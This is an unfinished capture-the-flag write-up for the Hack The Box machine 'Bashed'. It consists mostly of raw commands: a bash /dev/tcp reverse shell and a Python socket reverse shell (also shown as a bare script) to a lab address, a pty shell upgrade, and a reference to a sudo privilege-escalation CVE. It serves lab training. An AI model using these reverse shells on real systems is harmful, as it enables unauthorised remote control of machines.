---
title: Bashed Writeup
date: 2020-11-13 05:40:01
category: Hack The Box
---

# Bashed Writeup

![](./0.png)

## 0x01 信息收集

### 1、TCP Scan

![](./1.png)
已经拿下，回头补文。
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
nohup bash -i >& /dev/tcp/10.10.14.2/4444 0>&1

ls -a

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

su: must be run from a terminal

python -c 'import pty; pty.spawn("/bin/bash")'

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

CVE-2019-14287